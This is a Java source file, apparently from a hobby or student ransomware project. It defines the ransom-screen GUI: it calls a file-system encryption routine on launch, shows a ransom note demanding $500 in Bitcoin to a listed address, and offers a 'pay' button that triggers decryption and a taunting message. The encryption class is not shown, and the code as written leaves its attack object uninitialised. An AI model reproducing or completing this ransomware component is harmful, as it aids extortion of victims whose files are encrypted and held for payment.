package Agent.ransomGUI;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Graphics;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;

import Agent.Attack.AttackVector;
import Agent.exceptions.RansomwareException;

public class RansomGUI extends JFrame implements ActionListener {

	private JPanel panel;
	private JLabel label;
	private JButton paidButton;
	private AttackVector ransomProcess;
	private static final long serialVersionUID = -486811144121647925L;

	public RansomGUI() throws RansomwareException {
		label = new JLabel();
		panel = new JPanel();
		panel.setVisible(true);
		panel.setBackground(Color.BLACK);
		this.add(panel);
		this.setVisible(true);
		try {
			ransomProcess.encryptFileSystem();
			encryptionScreen();
		} catch (RansomwareException e) {
			throw new RansomwareException("failed encrypting file system", e.getCause());
		}
	}

	public void encryptionScreen() {

		paidButton = new JButton("pay");
		label.setText("<html><body dir=\"ltr\">\r\n" + "	<h1 align=\"center\">\r\n"
				+ "		<font size=\"20\" color=\"red\" face=\"Showcard Gothic\">oops, your\r\n"
				+ "			files have been encrypted !</font>\r\n" + "	</h1>\r\n" + "	<h2 align=\"center\">\r\n"
				+ "		<font face=\"Segoe UI Light\" color=\"red\">what happened to my\r\n"
				+ "			computer? </font>\r\n" + "	</h2>\r\n" + "	<p align=\"center\" dir=\"ltr\">\r\n"
				+ "		<font size=\"3\" color=\"white\"> your important files are\r\n"
				+ "			encrypted. <br /> Many of you documents and other files are no\r\n"
				+ "			longer accessible.<br /> Maybe you are busy looking for a way to\r\n"
				+ "			recover your files , but do not waste your time <br /> Nobody can\r\n"
				+ "			recover your files without our decryption service.\r\n" + "		</font>\r\n"
				+ "	</p>\r\n" + "\r\n" + "	<h2 align=\"center\">\r\n"
				+ "		<font size=\"6\" color=\"red\" face=\"Segoe UI Light\">can i recover\r\n"
				+ "			my files?</font>\r\n" + "	</h2>\r\n" + "\r\n" + "	<p align=\"center\" dir=\"ltr\">\r\n"
				+ "		<font size=\"3\" color=\"white\"> Sure, we promise you can recover\r\n"
				+ "			all of your important files safely and easily. <br /> All you need\r\n"
				+ "			to do, is pay us 500$ worth of Bitcoin.\r\n" + "		</font>\r\n" + "	</p>\r\n"
				+ "\r\n" + "	<h4 align=\"center\">\r\n"
				+ "		<font size=\"6\" color=\"red\" face=\"Segoe UI Light\">how do i pay?</font>\r\n"
				+ "	</h4>\r\n" + "	<p align=\"center\" dir=\"ltr\">\r\n"
				+ "		<font size=\"3\" color=\"white\"> Payment is accepted in Bitcoin\r\n"
				+ "			only <br /> send the correct amount to the address specified below.\r\n"
				+ "			<br /> Once your payment is checked, your files will be decrypted\r\n"
				+ "			immediatly\r\n" + "		</font>\r\n" + "	</p>\r\n"
				+ "	<p align=\"center\" dir=\"ltr\">\r\n"
				+ "		<font size=\"3\" face=\"Segoe UI Light\" color=\"white\"> send 500$\r\n"
				+ "			worth of Bitcoin to this adress: <br /> 1sf5hh454e5eyxvfdv\r\n" + "		</font>\r\n"
				+ "	</p>\r\n" + "\r\n" + "	<form\r\n \n\n</html>");
		panel.add(label);
		panel.add(paidButton, BorderLayout.CENTER);
		paidButton.addActionListener(this);
	}

	private void waitScreen() {
		label.setText("");
		label.setText("<html><body bgcolor=\"black\" dir=\"ltr\" >\r\n"
				+ "<h1 align=\"center\" ><font size=\"12\" color=\"red\" face=\"Showcard Gothic\">Loading... </font></h1>\r\n"
				+ "<br />\r\n" + "<p align=\"center\">\r\n" +

				"</p>\r\n" + "</body>\r\n" + "</html>");
		panel.add(label);
	}

	private void decryptionScreen() {
		label.setText("");
		label.setText("<html> <body bgcolor=\"black\" dir=\"ltr\">\r\n" + "\r\n"
				+ "<h1 align=\"center\" ><font size=\"20\" color=\"red\" face=\"Showcard Gothic\">AS WE PROMISED ,<br /> YOUR FILES ARE NOW DECRYPTED !</font></h1>\r\n"
				+ "<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\r\n"
				+ "<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\r\n"
				+ "<h6 align=\"LEFT\" ><font size=\"0.2\" color=\"yellow\" face=\"verdana\">have fun....for now..</font></h6>\r\n"
				+ "</body>\r\n </html>");
		panel.add(label);
	}

	@Override
	public void actionPerformed(ActionEvent e) {
		panel.remove(paidButton);
		waitScreen();
		try {

			ransomProcess.decryptFileSystem();
			decryptionScreen();

		} catch (RansomwareException e1) {

		}

	}

}
